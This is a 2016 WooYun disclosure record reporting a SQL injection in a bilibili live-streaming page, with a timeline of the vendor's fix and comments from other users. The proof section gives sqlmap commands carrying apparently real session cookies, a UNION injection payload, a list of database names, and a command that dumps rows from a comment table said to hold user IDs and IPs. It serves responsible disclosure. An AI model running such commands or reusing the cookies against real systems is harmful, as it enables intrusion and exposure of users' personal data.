{"id": 73065, "wybug_id": "wooyun-2016-0172994", "wybug_title": "bilibili某处SQL注入漏洞", "wybug_corp": "bilibili.com", "wybug_author": "creep", "wybug_date": "2016-01-27 13:07", "wybug_open_date": "2016-01-28 18:43", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-28：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 上次发的csrf被忽略了，很不开心:(  于是我就找到了个注入PS:求审核大大，给个前台。长这么大，没前台过:( 详细说明：  \n注入点：http://live.bilibili.com/i/operation?month=2016-01-01%2000:00:00\n\n\n\n\n   漏洞证明：  \nsqlmap.py -u \"http://live.bilibili.com/i/operation?month=2016-01-01%2000:00:00*\" --cookie=\"fts=1451713714; uTZ=-480; pgv_pvi=2566455296; tma=136533283.45964959.1451729767610.1451729767610.1451729767610.1; tmd=53.136533283.45964959.1451729767610.; _cnt_dyn=null; _cnt_pm=0; _cnt_notify=0; __utma=148949161.1557161098.1453816022.1453816022.1453816022.1; __utmz=148949161.1453816022.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); DedeID=153703; DedeUserID=20747478; DedeUserID__ckMd5=e1df39fd7037a65b; SESSDATA=64c73f99%2C1454421944%2C90ff3b12; LIVE_LOGIN_DATA=2ed7ee57c6067048b045bb6eb9b29ee72fbb108e; LIVE_LOGIN_DATA__ckMd5=913dd3abec658677; CNZZDATA2724999=cnzz_eid%3D903797384-1453819753-%26ntime%3D1453865260; user_face=http%3A%2F%2Fstatic.hdslb.com%2Fimages%2Fmember%2Fnoface.gif; sid=khvqxkr5; pgv_si=s1241440256; _dfcaptcha=06b808246b571c1e1c89368fc712b953; NotFirst=1\" --dbs\nsqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: UNION query    Title: MySQL UNION query (83) - 8 columns    Payload: http://live.bilibili.com:80/i/operation?month=2015-12-01 00:00:00' UNION ALL SELECT 83,83,83,CONCAT(0x716a627171,0x6372514d4f48527341756356757a77506c5948444152685373557a6d6d6c466a6256756773645a56,0x7176717671),83,83,83,83#---back-end DBMS: MySQL 5available databases [11]:[*] information_schema[*] live-app[*] live-coin[*] live-cost[*] live-damaku[*] live-giftlog[*] live-hamster[*] live-platform-user[*] live-sign[*] live-ugift[*] live-user=========================================================泄露了千万条直播弹幕的发言人uid、ip地址、内容等信息（不排除其他信息）以下仅仅测试10条，\nqlmap.py -u \"http://live.bilibili.com/i/operation?month=2016-01-01%2000:00:00*\" --cookie=\"fts=1451713714; uTZ=-480; pgv_pvi=2566455296; tma=136533283.45964959.1451729767610.1451729767610.1451729767610.1; tmd=53.136533283.45964959.1451729767610.; _cnt_dyn=null; _cnt_pm=0; _cnt_notify=0; __utma=148949161.1557161098.1453816022.1453816022.1453816022.1; __utmz=148949161.1453816022.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); DedeID=153703; DedeUserID=20747478; DedeUserID__ckMd5=e1df39fd7037a65b; SESSDATA=64c73f99%2C1454421944%2C90ff3b12; LIVE_LOGIN_DATA=2ed7ee57c6067048b045bb6eb9b29ee72fbb108e; LIVE_LOGIN_DATA__ckMd5=913dd3abec658677; CNZZDATA2724999=cnzz_eid%3D903797384-1453819753-%26ntime%3D1453865260; user_face=http%3A%2F%2Fstatic.hdslb.com%2Fimages%2Fmember%2Fnoface.gif; sid=khvqxkr5; pgv_si=s1241440256; _dfcaptcha=06b808246b571c1e1c89368fc712b953; NotFirst=1\" -D live-damaku -T dm_dmtable --dump --start 1 --stop 10\n\n\n\n\n   修复方案：     版权声明：转载请注明来源 creep@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-01-27 13:47 厂商回复： 攻城狮说要下午直播切腹 最新状态： 2016-01-28：已修复完成  ", "replys": "漏洞评价：\n评价\n     2016-01-27 13:40 |    \t\tphantom0307 \t\t\t( 普通白帽子  |\t\t\t        Rank:119 漏洞数:33        | Night time sharpensHeightens each sens...)\t\t \n  又来~我的b站账号可是很值钱的~~求手下留情    \n     2016-01-27 14:46 |    \t\t紫霞仙子  \t\t\t( 普通白帽子  |\t\t\t        Rank:2223 漏洞数:301        | 天天向上 ！！！)\t\t \n  求直播地址。    \n     2016-01-27 14:51 |    \t\tchock \t\t\t( 普通白帽子  |\t\t\t        Rank:118 漏洞数:28        | 若你喜欢怪人)\t\t \n  求直播切腹的av号    \n     2016-01-27 14:55 |    \t\t%230CC \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 溜溜)\t\t \n  66666666666666    \n     2016-01-27 14:58 |    \t\t乐乐 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:9        | 一名信息安全员)\t\t \n  提交漏洞的大神，本是同根生，相煎何太急？    \n     2016-01-27 15:10 |    \t\t帮5买(乌云厂商)\t\t \n  求直播切腹的av号     \n     2016-01-27 15:12 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:3        | 你猜)\t\t \n  6666 有硬币么    \n     2016-01-27 15:20 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:28        | 开发真是日了狗了)\t\t \n  一切up主都tm吃屁    \n     2016-01-27 15:26 |    \t\tnanpo \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | POI)\t\t \n  求直播地址。    \n     2016-01-27 15:50 |    \t\t乐乐 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:9        | 一名信息安全员)\t\t \n  怎么都这么幸灾乐祸！？求直播地址。    \n     2016-01-27 16:37 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  av10492    不用谢    \n     2016-01-27 18:26 |    \t\thkcs \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 只是路过)\t\t \n  直播地址呢    \n     2016-01-27 19:06 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:525 漏洞数:104        | going)\t\t \n  求直播地址。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}